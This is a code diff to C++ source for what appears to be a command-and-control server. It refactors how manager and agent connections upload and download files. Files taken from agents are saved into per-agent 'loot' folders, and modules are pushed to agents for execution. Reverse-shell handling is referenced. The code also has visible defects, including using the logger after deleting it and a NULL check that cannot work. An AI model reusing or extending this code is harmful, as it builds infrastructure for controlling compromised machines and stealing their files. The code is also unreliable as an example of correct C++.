@@ -2,7 +2,7 @@
 
 /*constructor for the connection instance*/
 ConnectionInstance::ConnectionInstance(class Server *server){
-    this->logger = server->get_log();
+    this->logger = new Log(server->get_log()->get_mutex());
     this->server = server;
     this->data = nullptr;
 }
@@ -13,7 +13,7 @@ ConnectionInstance::~ConnectionInstance(){
 }
 
 /*Handler for manager connections and flow*/
-void ConnectionInstance::manager_handler(){
+void ConnectionInstance::manager_handler() {
     int operation;
     int quitting = 0;
     int count = 0;
@@ -25,7 +25,6 @@ void ConnectionInstance::manager_handler(){
     char filename[2048];
     char *resp = (char *)malloc(2048);
     char buff[BUFSIZ];
-    char logbuff[BUFSIZ];
             
     // main instruction loop
     while (!quitting)
@@ -34,14 +33,12 @@ void ConnectionInstance::manager_handler(){
         ptr = resp;
         operation = -1;
         dat_ptr = NULL;
-
         
-        memset((void*)buff, 0, sizeof(buff));
-        memset((void*)tmpbuffer, 0, sizeof(tmpbuffer));
-        memset((void*)filename, 0, sizeof(filename));
-        memset((void*)resp, 0, 2048);
-        memset((void*)logbuff, 0, sizeof(logbuff));
-        memset((void*)tmpbf, 0, sizeof(tmpbf));
+        memset(buff, 0, sizeof(buff));
+        memset(tmpbuffer, 0, sizeof(tmpbuffer));
+        memset(filename, 0, sizeof(filename));
+        memset(resp, 0, 2048);
+        memset(tmpbf, 0, sizeof(tmpbf));
         
         // get operation request
         printf("Waiting for read\n");
@@ -69,14 +66,13 @@ void ConnectionInstance::manager_handler(){
             // Agent_id is stored in ptr
             d_ptr = strchr(ptr, ':') +1;
             if(d_ptr == NULL){
-                sprintf(logbuff, "Wrong format identified from input\n");
                 this->logger->log("Manager %d: Caught wrong format identifier in input\n", this->data->id);
                 return;
             }
             count = misc_index_of(ptr, ':', 0);
             dat_ptr = misc_substring(ptr, count, strlen(ptr));
             
-            transport->download_file(d_ptr, 1, dat_ptr);
+            this->download_file(d_ptr, 1, dat_ptr);
             AgentInformationHandler::task(AGENT_DOWN_FILE, dat_ptr, d_ptr);
             break;
 
@@ -94,7 +90,7 @@ void ConnectionInstance::manager_handler(){
             count = misc_index_of(ptr, ':', 0);
             dat_ptr = misc_substring(ptr, count, strlen(ptr));
             
-            transport->download_file(d_ptr, 1, dat_ptr);
+            this->download_file(d_ptr, 1, dat_ptr);
             
             AgentInformationHandler::task(AGENT_EXEC_MODULE, dat_ptr, d_ptr);
             break;
@@ -254,6 +250,101 @@ int ConnectionInstance::send_info(char *ptr){
 
 }
 
+/*Downloads file from connected entity*/
+int ConnectionInstance::download_file(char *ptr, int is_manager, char *extra){
+    int rc = 0;
+    size_t size = 0;
+    size_t size_e = 0;
+    const char *data_ptr;
+    unsigned char *enc_ptr;
+    char buff[BUFSIZ*2];
+    char tmpbuffer[256];
+    char logbuff[BUFSIZ];
+    FILE *file;
+
+
+    rc = this->transport->send_ok();
+    if(rc == 1){
+        printf("%s: Failed to write transport data\n", data->id);
+        return 1;
+    }
+
+    memset(tmpbuffer, 0, sizeof(tmpbuffer));
+    rc = this->transport->read((char**)&tmpbuffer, sizeof(tmpbuffer));
+    if(rc == 1){
+        printf("%s: Failed to read transport data\n", data->id);
+        return 1;
+    }
+
+    size = atoi(tmpbuffer);
+    data_ptr = (const char *)malloc(size+1);
+    memset((void*)data_ptr, 0, size+1);
+            
+    // writes file size
+    rc = this->transport->send_ok();
+    if(rc == 1){
+        printf("%s: Failed to write transport data\n", data->id);
+        return 1;
+    }
+    printf("%lu\n", size);
+    size_t tmpint = 0;
+    while (tmpint < size)
+    {
+        rc = this->transport->read((char **)&data_ptr+strlen(data_ptr), size-tmpint);
+        if(rc == 1){
+            printf("%s: Failed to read transport data\n", data->id);
+            return 1;
+        }
+        tmpint += rc;
+    
+    }
+    
+
+    size_e = B64::dec_size(data_ptr);
+
+    enc_ptr = (unsigned char *)malloc(size_e);
+    if(!B64::decode(data_ptr, enc_ptr, size_e)){
+        printf("%s: Failed to decode data\n", data->id);
+        free((void*)data_ptr);
+        free(enc_ptr);
+        rc = this->transport->send_err();
+        if(rc == 1){
+            printf("%s: Failed to write transport data\n", data->id);
+            return 1;
+        }
+        return 1;
+    }
+    free((void*)data_ptr);
+            
+    // writes file 
+    rc = this->transport->send_ok();
+    if(rc == 1){
+        printf("%s: Failed to read transport data\n", data->id);
+        return 1;
+    }
+
+    memset(buff, 0, sizeof(buff));
+    memset(tmpbuffer, 0, sizeof(tmpbuffer));
+    if(is_manager){
+        sprintf(buff, "%s/agents/%s/tasking/%s", getcwd(tmpbuffer, sizeof(tmpbuffer)), extra, ptr);
+    } else {
+        sprintf(buff, "%s/agents/%s/loot/%s", getcwd(tmpbuffer, sizeof(tmpbuffer)), data->id, ptr);
+    }
+    printf("%s\n", buff);
+    file = fopen(buff, "wb");
+    if(file == NULL){
+        perror("");
+        return 1;
+    }
+    fwrite(enc_ptr, 1, size_e, file);
+    fclose(file);
+    free(enc_ptr);
+
+    return 0;
+}
+
+
+
 /*Returns all available ports for accessing reverse shells*/
 void ConnectionInstance::get_ports(char *ptr){
 
@@ -348,7 +439,7 @@ void ConnectionInstance::agent_handler(){
             break;
 
         case AGENT_UP_FILE:
-            transport->download_file(ptr, 0, NULL);
+            this->download_file(ptr, 0, NULL);
             break;
 
         case AGENT_REV_SHELL:
@@ -376,12 +467,19 @@ void ConnectionInstance::shell_finish(){
     this->shell_finished = 1;
 }
 
+void ConnectionInstance::reload_logger(){
+    delete this->logger;
+    this->logger = new Log(this->logger->get_mutex());
+}
 
 /*Initialized the connection and prepares data structures for handlers*/
 void *ConnectionInstance::handle_connection(void *input){
     class ConnectionInstance *instance = (class ConnectionInstance *)input;
-
+    
+    // reload the logger because of threads not sharing stacks
+    instance->reload_logger();
     instance->get_transport()->listen();
+    
 
     // creates classes and instances
     int handler = instance->transport->determine_handler();
